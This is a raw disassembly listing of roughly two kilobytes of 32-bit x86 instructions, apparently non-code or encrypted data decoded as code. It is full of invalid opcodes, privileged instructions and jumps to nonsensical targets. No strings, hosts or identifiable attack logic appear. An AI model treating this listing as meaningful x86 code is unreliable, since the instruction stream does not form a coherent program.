  4136fc:	in     al,dx
  4136fd:	leave  
  4136fe:	lea    edi,[edi]
  413700:	dec    eax
  413701:	mov    bh,0x91
  413703:	inc    edi
  413704:	into   
  413705:	shl    BYTE PTR [edx],cl
  413707:	pop    esp
  413708:	pop    ecx
  413709:	in     eax,0xb4
  41370b:	ror    BYTE PTR [esi],1
  41370d:	aas    
  41370e:	pcmpgtb mm6,QWORD PTR [eax]
  413711:	or     BYTE PTR [ecx+eiz*8+0x55a288c],0xe7
  413719:	not    DWORD PTR [ebx+0x5f9f55f0]
  41371f:	mov    dl,ah
  413721:	push   ebx
  413722:	xchg   ecx,eax
  413723:	push   esi
  413724:	push   cs
  413725:	ds jae 0x4136f0
  413728:	cmp    eax,0x7b6c56d7
  41372d:	test   DWORD PTR [ebp+esi*1-0x68],esp
  413731:	leave  
  413732:	pop    esi
  413733:	jmp    0x4136b6
  413735:	fld    QWORD PTR [ebp-0x42]
  413738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413739:	inc    ecx
  41373a:	inc    edx
  41373b:	lods   eax,DWORD PTR ds:[esi]
  41373c:	and    esp,DWORD PTR [edi-0x39750b5f]
  413742:	push   edi
  413743:	xchg   esi,eax
  413744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413745:	xor    eax,0x9208fbcb
  41374a:	mov    dh,0xa3
  41374c:	inc    edi
  41374d:	jns    0x4136f2
  41374f:	mov    ecx,0x5660790d
  413754:	daa    
  413755:	cdq    
  413756:	icebp  
  413757:	adc    BYTE PTR [edi+edx*2+0x40d5feea],cl
  41375e:	lahf   
  41375f:	scas   al,BYTE PTR es:[edi]
  413760:	ret    0x9892
  413763:	loopne 0x41375a
  413765:	add    al,0xe5
  413767:	mov    ds:0x3c9796be,al
  41376c:	xor    dh,bl
  41376e:	stos   DWORD PTR es:[edi],eax
  41376f:	cmp    al,0x11
  413771:	and    dh,dl
  413773:	mov    ds:0x77c20441,eax
  413778:	dec    ebp
  413779:	and    edx,DWORD PTR [edi-0x3b01f3f9]
  41377f:	mov    ds:0x5c8729c5,al
  413784:	scas   eax,DWORD PTR es:[edi]
  413785:	std    
  413786:	fstp   DWORD PTR [edi-0x67026075]
  41378c:	cmp    ah,bh
  41378e:	sub    BYTE PTR [edi+0x39],0xde
  413792:	loope  0x4137a5
  413794:	enter  0xbba4,0xf5
  413798:	lds    eax,FWORD PTR [edi-0x5a28ea]
  41379e:	sti    
  41379f:	test   BYTE PTR [eax+0x502b9e7e],0x97
  4137a6:	mov    cl,0xb4
  4137a8:	call   DWORD PTR ds:0xefd6c3f2
  4137ae:	jne    0x413799
  4137b0:	adc    cl,BYTE PTR [edi-0x38]
  4137b3:	dec    ebx
  4137b4:	push   ecx
  4137b5:	jg     0x4137f9
  4137b7:	xchg   esp,eax
  4137b8:	call   0xc3f742cd
  4137bd:	scas   eax,DWORD PTR es:[edi]
  4137be:	jecxz  0x4137f1
  4137c0:	stc    
  4137c1:	clc    
  4137c2:	ins    DWORD PTR es:[edi],dx
  4137c3:	ja     0x41377e
  4137c5:	mov    al,0x4d
  4137c7:	jno    0x41378c
  4137c9:	mov    bh,0x3
  4137cb:	pop    eax
  4137cc:	mov    dl,0xa2
  4137ce:	mov    ds:0x55f437ab,eax
  4137d3:	leave  
  4137d4:	jmp    0x413843
  4137d6:	jnp    0x41380b
  4137d8:	(bad)
  4137db:	push   ecx
  4137dc:	stos   BYTE PTR es:[edi],al
  4137dd:	clc    
  4137de:	jnp    0x413800
  4137e0:	xlat   BYTE PTR ds:[ebx]
  4137e1:	push   edx
  4137e2:	jp     0x413834
  4137e4:	pop    ds
  4137e5:	in     al,0x56
  4137e7:	jno    0x413859
  4137e9:	and    DWORD PTR [ebx],edx
  4137eb:	jle    0x413805
  4137ed:	xor    eax,0xf3f2ac6
  4137f2:	mov    ds:0x91823400,al
  4137f7:	mov    ds,WORD PTR [esp+eax*8]
  4137fa:	mov    eax,ds:0xca6dbaed
  4137ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413801:	lods   eax,DWORD PTR ds:[esi]
  413802:	cli    
  413803:	dec    esi
  413804:	xor    BYTE PTR [edx-0x62],cl
  413807:	inc    esi
  413808:	scas   al,BYTE PTR es:[edi]
  413809:	xor    eax,0xd6e590d0
  41380e:	mov    edi,0x2db07c6f
  413813:	repz cmp eax,0xab566e8b
  413819:	ins    BYTE PTR es:[edi],dx
  41381a:	(bad)  
  41381b:	js     0x41385b
  41381d:	pop    esp
  41381e:	in     eax,0x1a
  413820:	add    dh,BYTE PTR [edx]
  413822:	adc    al,0x8a
  413824:	mov    ebp,DWORD PTR [edx-0x61]
  413827:	adc    DWORD PTR [esi],edi
  413829:	inc    esi
  41382a:	dec    ebx
  41382b:	or     al,0xac
  41382d:	lds    ebx,FWORD PTR [eax]
  41382f:	pushf  
  413830:	jmp    0x576:0xe88fc569
  413837:	mov    al,ds:0x74069215
  41383c:	push   es
  41383d:	call   0x98e9:0x704eb9c7
  413844:	(bad)  
  413845:	mov    ds:0x5a9eaf6a,eax
  41384a:	xor    esp,DWORD PTR [esp+edx*8+0x4a]
  41384e:	test   eax,0x326ebb5e
  413853:	jbe    0x41383e
  413855:	inc    ebp
  413856:	adc    BYTE PTR [edi],bh
  413858:	jmp    0x28ba0514
  41385d:	loope  0x41381b
  41385f:	call   0x71ce:0xa0f3b3ca
  413866:	xor    eax,0xa1c6fcb2
  41386b:	(bad)  
  41386c:	arpl   WORD PTR [ecx],ax
  41386e:	fwait
  41386f:	xlat   BYTE PTR ds:[ebx]
  413870:	ds in  eax,dx
  413872:	dec    ecx
  413873:	lods   eax,DWORD PTR ds:[esi]
  413874:	inc    ebp
  413875:	loopne 0x413822
  413877:	ja     0x4137fa
  413879:	add    eax,0xae520d2c
  41387e:	jnp    0x41384c
  413880:	cmp    al,0x7
  413882:	addr16 js 0x413832
  413885:	(bad)  
  413886:	aad    0xb3
  413888:	inc    edx
  413889:	jg     0x4138cb
  41388b:	pop    esi
  41388c:	stos   DWORD PTR es:[edi],eax
  41388d:	lds    esp,FWORD PTR [ecx-0x22]
  413890:	fiadd  DWORD PTR [ebx+0x4ed3d952]
  413896:	jo     0x4138f2
  413898:	in     eax,dx
  413899:	inc    ecx
  41389a:	jae    0x413822
  41389c:	and    esp,DWORD PTR [edi-0x67c97946]
  4138a2:	mov    DWORD PTR [esi-0x19bce51a],ebx
  4138a8:	inc    ecx
  4138a9:	push   esp
  4138aa:	jae    0x4138db
  4138ac:	or     dl,bl
  4138ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138af:	sub    bh,ch
  4138b1:	add    dh,ch
  4138b3:	pop    ecx
  4138b4:	dec    eax
  4138b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138b6:	jae    0x413879
  4138b8:	mov    ah,0x69
  4138ba:	aam    0x59
  4138bc:	bound  esp,QWORD PTR [ecx-0x74]
  4138bf:	ins    BYTE PTR es:[edi],dx
  4138c0:	test   eax,0xf6da4457
  4138c5:	pop    ecx
  4138c6:	das    
  4138c7:	test   DWORD PTR [ecx-0x4dd24ebe],eax
  4138cd:	ss (bad) 
  4138cf:	jne    0x413884
  4138d1:	cmp    ebx,edi
  4138d3:	mov    esp,0x35770ef1
  4138d8:	je     0x413886
  4138da:	and    al,0xdc
  4138dc:	inc    ecx
  4138dd:	sbb    ebx,DWORD PTR [edi-0x4a]
  4138e0:	fwait
  4138e1:	push   0x899a2b0a
  4138e6:	es dec ecx
  4138e8:	adc    eax,ebp
  4138ea:	pop    esi
  4138eb:	jp     0x4138a0
  4138ed:	rol    DWORD PTR [edi-0x77fd80d8],cl
  4138f3:	adc    cl,BYTE PTR [ecx+eax*4]
  4138f6:	cmp    eax,0xf3d44a3d
  4138fb:	jge    0x4138b1
  4138fd:	fld    st(6)
  4138ff:	and    BYTE PTR [esi-0x7dcff3d3],al
  413905:	sub    al,0xb4
  413907:	jp     0x4138bf
  413909:	or     DWORD PTR [eax+0x4c18dcc1],esp
  41390f:	mov    ebp,DWORD PTR [edx]
  413911:	(bad)
  413915:	lds    eax,FWORD PTR [esi]
  413917:	int3   
  413918:	adc    ah,BYTE PTR [ebx]
  41391a:	js     0x41390c
  41391c:	lock imul eax,DWORD PTR [esi+0x60],0xff637dad
  413924:	int    0xcf
  413926:	mov    ah,0xfb
  413928:	push   esp
  413929:	outs   dx,DWORD PTR ds:[esi]
  41392a:	inc    edx
  41392b:	jge    0x4138f2
  41392d:	gs dec eax
  41392f:	or     DWORD PTR [edi],ecx
  413931:	mov    ch,0x16
  413933:	jno    0x413998
  413935:	add    eax,0x4c3f3123
  41393a:	mov    ebp,0xf601263f
  41393f:	pop    es
  413940:	cmp    al,0x70
  413942:	sub    BYTE PTR [ebx-0x2e01e0b2],ah
  413948:	hlt    
  413949:	dec    ebp
  41394a:	retf   0xea7a
  41394d:	iret   
  41394e:	arpl   WORD PTR [esi],di
  413950:	imul   edi,DWORD PTR [edx+0x389f680d],0xffffffce
  413957:	xor    edx,edx
  413959:	lock cld 
  41395b:	xor    cl,BYTE PTR [ebx+ecx*8-0x45762f46]
  413962:	adc    eax,0x27408e5a
  413967:	push   0xffffff8b
  413969:	push   0xabfee935
  41396e:	and    BYTE PTR [eax-0x2d2384b0],bh
  413974:	jecxz  0x413989
  413976:	sub    DWORD PTR [edx-0x17],ebp
  413979:	add    edx,DWORD PTR [esi]
  41397b:	in     al,0x20
  41397d:	lods   eax,DWORD PTR ds:[esi]
  41397e:	das    
  41397f:	sub    BYTE PTR [ebp+0x2422aa78],ch
  413985:	cld    
  413986:	js     0x41397c
  413988:	pop    esi
  413989:	pop    es
  41398a:	push   ss
  41398b:	popf   
  41398c:	clc    
  41398d:	inc    ecx
  41398e:	and    DWORD PTR [edx-0x78685cb3],ecx
  413994:	fwait
  413995:	outs   dx,DWORD PTR ds:[esi]
  413996:	ds cmp ebp,DWORD PTR cs:[eax]
  41399a:	cmp    eax,0x5e67a3bc
  41399f:	scas   al,BYTE PTR es:[edi]
  4139a0:	retf   0x7b3d
  4139a3:	inc    dh
  4139a5:	fnsave [edx-0x3d]
  4139a8:	fadd   st,st(5)
  4139aa:	sub    al,0x99
  4139ac:	ror    dl,1
  4139ae:	repnz (bad) 
  4139b0:	addr16 test eax,0xbdb8437a
  4139b6:	jmp    0x413a0c
  4139b8:	or     DWORD PTR [esi-0xb],ebp
  4139bb:	inc    ecx
  4139bc:	(bad)  
  4139bd:	xor    eax,0x1c6c8440
  4139c2:	jmp    0x413977
  4139c4:	int3   
  4139c5:	cmc    
  4139c6:	mov    ecx,0xa2320880
  4139cb:	xor    al,BYTE PTR [edx+0x1ebfb660]
  4139d1:	mov    ebp,0xa6afc505
  4139d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139d7:	mov    ebp,0x262b4669
  4139dd:	sub    esi,DWORD PTR [eax]
  4139df:	mov    eax,ds:0xf4840720
  4139e4:	loop   0x4139c3
  4139e6:	adc    BYTE PTR ds:0x91ffe5e6,dh
  4139ec:	xchg   ecx,eax
  4139ed:	inc    edx
  4139ee:	call   0x8a58:0xcdc96795
  4139f5:	ins    BYTE PTR es:[edi],dx
  4139f6:	push   ebx
  4139f7:	mov    cl,0x85
  4139f9:	imul   ebx,DWORD PTR [ebx+0x299110d7],0xa75bb79
  413a03:	ja     0x413a4d
  413a05:	pop    DWORD PTR [ebp-0x4431856b]
  413a0b:	add    BYTE PTR [edi+ebx*8],bl
  413a0e:	stos   DWORD PTR es:[edi],eax
  413a0f:	or     BYTE PTR [ebx-0x79],0x17
  413a13:	lods   eax,DWORD PTR ds:[esi]
  413a14:	pusha  
  413a15:	and    edx,DWORD PTR [ecx+0x12]
  413a18:	jbe    0x413a69
  413a1a:	loopne 0x4139c3
  413a1c:	fimul  DWORD PTR [edi+0x7231fbd9]
  413a22:	mov    ebx,0x228b56f2
  413a27:	(bad)  ds:0xd26371fb
  413a2d:	rdmsr  
  413a2f:	cmp    ebx,DWORD PTR [edx-0x55]
  413a32:	ret    
  413a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a34:	adc    eax,0x37daf0d2
  413a39:	shl    BYTE PTR [ebx],1
  413a3b:	add    ah,ah
  413a3d:	cdq    
  413a3e:	dec    ecx
  413a3f:	pop    ss
  413a40:	mov    dh,0xf4
  413a42:	stos   BYTE PTR es:[edi],al
  413a43:	mov    ebp,0x9df5142a
  413a48:	inc    edi
  413a49:	pop    ebx
  413a4a:	xchg   ebx,eax
  413a4b:	sti    
  413a4c:	imul   esi,DWORD PTR [ebx-0x5fddee03],0xb6a34d55
  413a56:	cmp    DWORD PTR [esi+0x14],eax
  413a59:	mov    ecx,0x32232f6b
  413a5e:	out    0xff,al
  413a60:	pop    edx
  413a61:	cmp    esp,DWORD PTR [ecx-0x35]
  413a64:	ins    BYTE PTR es:[edi],dx
  413a65:	adc    ebp,DWORD PTR [ebp-0x2df0f584]
  413a6b:	icebp  
  413a6c:	inc    esp
  413a6d:	retf   
  413a6e:	cli    
  413a6f:	inc    ebx
  413a70:	ja     0x413a47
  413a72:	mov    ds:0xde5d6f84,eax
  413a77:	aas    
  413a78:	xlat   BYTE PTR ds:[ebx]
  413a79:	ins    BYTE PTR es:[edi],dx
  413a7a:	dec    ecx
  413a7b:	xchg   ecx,eax
  413a7c:	sbb    eax,0x69f214f5
  413a81:	adc    al,BYTE PTR [esi]
  413a83:	shr    BYTE PTR [esi+eax*2-0x6e],1
  413a87:	mov    WORD PTR [edi-0x522f1483],es
  413a8d:	xchg   al,cl
  413a8f:	mov    ch,bl
  413a91:	pop    ss
  413a92:	in     eax,dx
  413a93:	ret    0x9cfe
  413a96:	sbb    dh,BYTE PTR [edi+0x26]
  413a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a9a:	jo     0x413ad0
  413a9c:	cwde   
  413a9d:	mov    bl,BYTE PTR [eax-0x4c]
  413aa0:	scas   al,BYTE PTR es:[edi]
  413aa1:	push   ss
  413aa2:	stos   DWORD PTR es:[edi],eax
  413aa3:	push   edx
  413aa4:	sub    eax,0x8108c55b
  413aa9:	pop    esi
  413aaa:	test   eax,0x93fcb81f
  413aaf:	sbb    dl,BYTE PTR [ecx-0x512c3e52]
  413ab5:	mov    cl,0xdb
  413ab7:	fbstp  TBYTE PTR [edi-0x43587bf7]
  413abd:	inc    edx
  413abe:	ret    0x30c8
  413ac1:	push   eax
  413ac2:	data16 jge 0x413b0c
  413ac5:	loope  0x413ad2
  413ac7:	sbb    eax,0x1614a212
  413acc:	or     BYTE PTR [esi-0x4c],ch
  413acf:	fcmovne st,st(1)
  413ad1:	pop    edi
  413ad2:	jbe    0x413ab2
  413ad4:	out    0x8b,eax
  413ad6:	pop    edi
  413ad7:	xchg   DWORD PTR [esi],edi
  413ad9:	jl     0x413a6e
  413adb:	rol    DWORD PTR [ebp+eiz*8-0x763592f9],cl
  413ae2:	in     al,0x61
  413ae4:	mov    WORD PTR [eax-0x24d6b86c],es
  413aea:	mov    edx,0xff5d7b22
  413aef:	lahf   
  413af0:	mov    esi,0xf6a92bbc
  413af5:	imul   ecx,DWORD PTR [ecx+0x2734f1f8],0x9fb5e95e
  413aff:	push   ds
  413b00:	outs   dx,DWORD PTR ds:[esi]
  413b01:	sti    
  413b02:	shl    DWORD PTR [esi],0x63
  413b05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b06:	(bad)  
  413b07:	arpl   di,bp
  413b09:	xchg   edi,eax
  413b0a:	mov    ch,0x40
  413b0c:	in     al,0x9c
  413b0e:	mov    ?,WORD PTR [edi+0x2f7dac63]
  413b14:	test   al,0xac
  413b16:	or     DWORD PTR [eax+0x1a],ebp
  413b19:	repz add eax,0x6a6fc029
  413b1f:	pop    eax
  413b20:	xor    al,0xe7
  413b22:	add    DWORD PTR [edx+ecx*4-0x2e5de205],eax
  413b29:	xchg   edx,eax
  413b2a:	sbb    esp,edx
  413b2c:	pop    ebp
  413b2d:	test   BYTE PTR [edx+0x58],dh
  413b30:	das    
  413b31:	stos   BYTE PTR es:[edi],al
  413b32:	das    
  413b33:	sar    DWORD PTR [edx+0x72b6e11b],0x6e
  413b3a:	addr16 (bad) 
  413b3c:	mov    eax,0x6bf23150
  413b41:	inc    ecx
  413b42:	or     ah,BYTE PTR cs:[esi+0xd346823]
  413b49:	retf   0x8f5f
  413b4c:	std    
  413b4d:	pop    ebp
  413b4e:	dec    ebp
  413b4f:	cs std 
  413b51:	out    0xc3,al
  413b53:	inc    eax
  413b54:	(bad)  
  413b55:	jne    0x413b4e
  413b57:	jnp    0x413bb8
  413b59:	xchg   esp,eax
  413b5a:	popf   
  413b5b:	fidiv  DWORD PTR [eax+0x536f26f0]
  413b61:	and    al,0xc
  413b63:	mov    BYTE PTR [esi],dh
  413b65:	in     eax,0x86
  413b67:	jns    0x413b3e
  413b69:	sti    
  413b6a:	xor    al,0x41
  413b6c:	sti    
  413b6d:	cmp    al,0xa8
  413b6f:	push   ebx
  413b70:	push   ss
  413b71:	pushf  
  413b72:	add    eax,0x8f206cfc
  413b77:	xchg   esp,eax
  413b78:	push   cs
  413b79:	inc    eax
  413b7a:	push   edx
  413b7b:	int    0x70
  413b7d:	adc    al,0x36
  413b7f:	call   0x6cd3d36a
  413b84:	mov    BYTE PTR [ebx+0x3d],bl
  413b87:	mov    eax,ds:0xd31a8aec
  413b8c:	cmp    ecx,DWORD PTR [ecx+0x66]
  413b8f:	vxorps xmm0,xmm0,XMMWORD PTR [edi]
  413b93:	dec    ebp
  413b94:	aas    
  413b95:	sub    DWORD PTR [edx-0x1c],ecx
  413b98:	jb     0x413b9f
  413b9a:	push   ds
  413b9b:	xchg   ecx,eax
  413b9c:	jp     0x413b41
  413b9e:	mov    dh,BYTE PTR [ebx+0x12c63c02]
  413ba4:	scas   al,BYTE PTR es:[edi]
  413ba5:	bound  ecx,QWORD PTR [esp+ebp*1-0x66]
  413ba9:	add    al,BYTE PTR [edi-0x57cb3b88]
  413baf:	addr16 dec eax
  413bb1:	add    cl,0x93
  413bb4:	out    dx,al
  413bb5:	add    BYTE PTR [ebp-0x6b4b9274],ah
  413bbb:	fadd   st(3),st
  413bbd:	push   ebx
  413bbe:	lahf   
  413bbf:	dec    esp
  413bc0:	cwde   
  413bc1:	stos   DWORD PTR es:[edi],eax
  413bc2:	fisttp QWORD PTR [edx-0x4f]
  413bc5:	rol    dl,0xfd
  413bc8:	cmp    BYTE PTR [ebx-0x68],0xa8
  413bcc:	(bad)  
  413bcd:	shl    BYTE PTR [ecx+0x1523ef15],1
  413bd3:	xchg   ebp,eax
  413bd4:	inc    edx
  413bd5:	neg    bh
  413bd7:	shl    eax,0x34
  413bda:	test   al,0xf8
  413bdc:	test   al,0xac
  413bde:	xchg   ebp,eax
  413bdf:	adc    ecx,eax
  413be1:	lods   eax,DWORD PTR ds:[esi]
  413be2:	sub    esi,DWORD PTR [eax-0x68f834d4]
  413be8:	adc    eax,0x9b70635f
  413bed:	jmp    0x3de9243e
  413bf2:	mov    ecx,DWORD PTR [edi]
  413bf4:	ret    
  413bf5:	cdq    
  413bf6:	ror    BYTE PTR [eax],1
  413bf8:	mov    BYTE PTR [eax+0x60],0x12
  413bfc:	(bad)  
  413bfd:	pop    eax
  413bfe:	xor    ch,BYTE PTR [ecx+0x31]
  413c01:	mov    ebx,0x7905fa4f
  413c06:	or     BYTE PTR [ebx-0x1a8dd49f],0x78
  413c0d:	jo     0x413c7a
  413c0f:	into   
  413c10:	in     al,0x8c
  413c12:	mov    ch,0x21
  413c14:	cdq    
  413c15:	jns    0x413c61
  413c17:	lods   al,BYTE PTR ds:[esi]
  413c18:	fistp  QWORD PTR [esi+0x22]
  413c1b:	sub    al,0x9e
  413c1d:	lods   eax,DWORD PTR ds:[esi]
  413c1e:	adc    eax,ebp
  413c20:	leave  
  413c21:	jle    0x413bbe
  413c23:	xchg   ecx,eax
  413c24:	leave  
  413c25:	mov    bl,0xf
  413c27:	nop
  413c28:	retf   0xe734
  413c2b:	das    
  413c2c:	cmp    BYTE PTR [eax-0x23],dh
  413c2f:	mov    ds:0xf3aec66,al
  413c34:	into   
  413c35:	pop    ss
  413c36:	and    BYTE PTR [ebx+0x4],ch
  413c39:	adc    bl,BYTE PTR [ebx+0x57716348]
  413c3f:	scas   al,BYTE PTR es:[edi]
  413c40:	xor    BYTE PTR [edi-0x41],0x2b
  413c44:	ins    BYTE PTR es:[edi],dx
  413c45:	aas    
  413c46:	das    
  413c47:	inc    eax
  413c48:	call   0xea48:0x669fe62e
  413c4f:	int3   
  413c50:	push   es
  413c51:	or     eax,DWORD PTR [edi]
  413c53:	push   ebp
  413c54:	rol    DWORD PTR [ecx],1
  413c56:	shl    esp,cl
  413c58:	mov    cl,0xea
  413c5a:	call   0xdead:0x2e07ea5d
  413c61:	lds    esp,FWORD PTR [edi+0x11834099]
  413c67:	pop    esi
  413c68:	mov    cl,0x28
  413c6a:	hlt    
  413c6b:	dec    ebp
  413c6c:	loopne 0x413c20
  413c6e:	xchg   ecx,eax
  413c6f:	xor    eax,eax
  413c71:	mov    edx,0xdaa323ef
  413c76:	mov    cl,BYTE PTR [ebp-0x56]
  413c79:	adc    esi,0x3e3ad434
  413c7f:	xor    ch,0x92
  413c82:	sub    DWORD PTR [ebx-0x54],0x3983ff6a
  413c89:	arpl   WORD PTR [ebp+ebp*8+0x5],si
  413c8d:	call   DWORD PTR [edx-0x48cad5ed]
  413c93:	mul    bh
  413c95:	xchg   ebp,eax
  413c96:	adc    DWORD PTR [edi+0x5c],ebp
  413c99:	inc    ebx
  413c9a:	xor    bl,BYTE PTR [ebp-0x3c332c70]
  413ca0:	push   0x7c743f88
  413ca5:	dec    ebx
  413ca6:	dec    ebp
  413ca7:	ficom  WORD PTR [ebx+0x731f0b38]
  413cad:	adc    DWORD PTR [ebx],edx
  413caf:	dec    ecx
  413cb0:	inc    eax
  413cb1:	(bad)  
  413cb2:	cmp    DWORD PTR [esi],esi
  413cb4:	mov    esp,0x5c10cfb6
  413cb9:	les    esi,FWORD PTR [ebx-0x42df0cb7]
  413cbf:	lock or ecx,DWORD PTR [ebx-0x77ed812a]
  413cc6:	push   ds
  413cc7:	(bad)  [edx+0x1bbd7cde]
  413ccd:	jo     0x413c71
  413ccf:	data16 int 0x91
  413cd2:	inc    esi
  413cd3:	mov    ah,0x1a
  413cd5:	push   esp
  413cd6:	hlt    
  413cd7:	jae    0x413c71
  413cd9:	inc    ecx
  413cda:	mov    dl,0xd8
  413cdc:	imul   esp,DWORD PTR [edi+0x331f9e01],0x63a6c001
  413ce6:	gs pop eax
  413ce8:	push   es
  413ce9:	test   bl,bh
  413ceb:	push   edi
  413cec:	mov    ah,0x63
  413cee:	lahf   
  413cef:	sub    cl,BYTE PTR [edx-0x23df26b9]
  413cf5:	into   
  413cf6:	lea    ebx,ds:0xdcdf7226
  413cfc:	test   eax,0x147265f0
  413d01:	jb     0x413d7c
  413d03:	add    al,0x4d
  413d05:	lods   al,BYTE PTR ds:[esi]
  413d06:	dec    eax
  413d07:	sub    al,0x6c
  413d09:	ror    DWORD PTR [eax],cl
  413d0b:	inc    edx
  413d0c:	test   al,0x37
  413d0e:	jg     0x413cca
  413d10:	imul   eax,DWORD PTR [edi+eiz*8],0x53
  413d14:	fstp   st(4)
  413d16:	(bad)  
  413d17:	mov    DWORD PTR [esi-0x7c3c996d],ebx
  413d1d:	xor    BYTE PTR [ebx-0x6d9223ef],0x7
  413d24:	or     cl,BYTE PTR [eax+0x5d]
  413d27:	dec    esp
  413d28:	mov    WORD PTR [edi],es
  413d2a:	call   0x3069:0xca438674
  413d31:	ins    BYTE PTR es:[edi],dx
  413d32:	call   FWORD PTR [eax-0x75]
  413d35:	in     eax,0xd5
  413d37:	mov    WORD PTR [ebx+eax*2+0x17],es
  413d3b:	jno    0x413d03
  413d3d:	nop
  413d3e:	jge    0x413ce4
  413d40:	mov    bh,0x3a
  413d42:	les    ecx,FWORD PTR [ebp-0x4]
  413d45:	lods   eax,DWORD PTR ds:[esi]
  413d46:	test   DWORD PTR [edi+0x4c34a4e1],ebp
  413d4c:	jno    0x413cce
  413d4e:	pusha  
  413d4f:	test   ebp,edx
  413d51:	pop    edi
  413d52:	ret    0x19ae
  413d55:	mov    cl,0xab
  413d57:	jne    0x413d3a
  413d59:	jns    0x413d0d
  413d5b:	out    dx,eax
  413d5c:	xchg   ecx,eax
  413d5d:	je     0x413d32
  413d5f:	(bad)  
  413d60:	lods   eax,DWORD PTR ds:[esi]
  413d61:	cli    
  413d62:	aas    
  413d63:	addr16 xchg edi,eax
  413d65:	lods   al,BYTE PTR ds:[esi]
  413d66:	sub    BYTE PTR [esi],0x7f
  413d69:	or     al,BYTE PTR [edx-0x2]
  413d6c:	nop
  413d6d:	xor    bh,BYTE PTR [edi+0x3143e2ab]
  413d73:	fstp   QWORD PTR [ebp+0x4a]
  413d76:	cmp    eax,0x9adbc707
  413d7b:	jno    0x413d95
  413d7d:	in     eax,dx
  413d7e:	jecxz  0x413df1
  413d80:	idiv   DWORD PTR [esi]
  413d82:	push   es
  413d83:	or     eax,eax
  413d85:	(bad)  
  413d86:	mov    bl,0xed
  413d88:	popf   
  413d89:	inc    ecx
  413d8a:	dec    ebx
  413d8b:	lods   al,BYTE PTR ds:[esi]
  413d8c:	out    0xb1,al
  413d8e:	mov    edi,0x1daf1012
  413d93:	push   ss
  413d94:	adc    ebx,DWORD PTR [edi]
  413d96:	nop
  413d97:	mov    eax,0x3423570a
  413d9c:	mov    bl,0xfd
  413d9e:	addr16 loope 0x413de9
  413da1:	push   0x54029ae6
  413da6:	sub    ch,BYTE PTR [edi-0x39]
  413da9:	std    
  413daa:	test   al,0x55
  413dac:	add    bh,al
  413dae:	mov    dl,0x15
  413db0:	adc    DWORD PTR ds:0x80af9881,eax
  413db6:	test   eax,0xbd2787a9
  413dbb:	sbb    DWORD PTR [esi],ecx
  413dbd:	fs hlt 
  413dbf:	xor    ebx,ebx
  413dc1:	loope  0x413d67
  413dc3:	mov    ds:0x2d4d6ba6,eax
  413dc8:	in     al,dx
  413dc9:	dec    ecx
  413dca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413dcb:	dec    ebx
  413dcc:	shl    DWORD PTR [ebp+0x1c],1
  413dcf:	sbb    ebx,DWORD PTR [ebx+edx*8-0xc]
  413dd3:	pop    eax
  413dd4:	xchg   ecx,eax
  413dd5:	test   DWORD PTR [edi],edi
  413dd7:	jns    0x413e54
  413dd9:	add    al,0x95
  413ddb:	fld    DWORD PTR [ebp+0xb]
  413dde:	fmul   st,st(5)
  413de0:	push   ecx
  413de1:	lahf   
  413de2:	jb     0x413d91
  413de4:	test   al,0xd3
  413de6:	pop    es
  413de7:	outs   dx,DWORD PTR ds:[esi]
  413de8:	xchg   edx,eax
  413de9:	and    eax,0xa0630692
  413dee:	inc    ecx
  413def:	dec    edi
  413df0:	inc    eax
  413df1:	mov    BYTE PTR [ebp-0x17],al
  413df4:	xor    ah,ch
  413df6:	sub    eax,DWORD PTR [esp+ebx*4]
  413df9:	add    dh,ah
  413dfb:	scas   al,BYTE PTR es:[edi]
  413dfc:	pop    es
  413dfd:	jo     0x413d83
  413dff:	fist   DWORD PTR [ebx]
  413e01:	inc    ecx
  413e02:	gs dec ebx
  413e04:	sub    eax,edx
  413e06:	fld    TBYTE PTR [ecx+0x547b9f7f]
  413e0c:	mov    DWORD PTR [eax],edx
  413e0e:	or     eax,0x65dd766e
  413e13:	pop    ebp
  413e14:	sbb    BYTE PTR [ebp-0x4ac30a0b],dl
  413e1a:	xlat   BYTE PTR ds:[ebx]
  413e1b:	fiadd  WORD PTR [ebx+eax*4]
  413e1e:	inc    esp
  413e1f:	cmp    eax,eax
  413e21:	cmp    BYTE PTR [edx-0x55c441dd],ch
  413e27:	mov    ch,0xff
  413e29:	cmp    eax,0x6ec2462a
  413e2f:	xchg   edx,eax
  413e30:	mov    ebp,0xe2e95ddb
  413e35:	sub    bh,bh
  413e37:	dec    esp
  413e38:	fadd   DWORD PTR [si-0x11]
  413e3c:	sub    BYTE PTR [esi-0x5ad2781e],bh
  413e42:	lods   al,BYTE PTR ds:[esi]
  413e43:	test   al,0xeb
  413e45:	dec    edi
  413e46:	lods   eax,DWORD PTR ds:[esi]
  413e47:	out    0x1b,al
  413e49:	jp     0x413ead
  413e4b:	and    eax,0x9c478248
  413e50:	dec    esi
  413e51:	dec    ecx
  413e52:	adc    eax,0x7aeb9bde
  413e57:	mov    ecx,0xfd40426
  413e5c:	or     eax,0xcced8cfb
  413e61:	in     eax,0x13
  413e63:	add    BYTE PTR [eax+0x450bbe22],dl
  413e69:	cmp    ah,BYTE PTR ds:0x336bd957
  413e6f:	push   0x44a26a68
  413e74:	cmp    eax,DWORD PTR [ebx]
  413e76:	mov    esp,0x6188bca
  413e7b:	and    edx,DWORD PTR [ecx]
  413e7d:	out    dx,eax
  413e7e:	in     al,dx
  413e7f:	shr    DWORD PTR [eax],0x4f
  413e82:	outs   dx,BYTE PTR ds:[esi]
  413e83:	dec    edx
  413e84:	adc    ebx,ebx
  413e86:	call   0xb9203e9
  413e8b:	sbb    BYTE PTR [edx+0x5047c5af],al
  413e91:	push   esi
  413e92:	adc    BYTE PTR [edx-0x7cf6c637],bh
  413e98:	sub    eax,DWORD PTR [ecx-0x76e6b6f7]
  413e9e:	mov    ecx,0xe24a9009
  413ea3:	retf   0xff79
  413ea6:	retf   
  413ea7:	mov    ds:0x382e9d7e,al
  413eac:	sub    eax,0x5814f9bf
  413eb1:	(bad)  
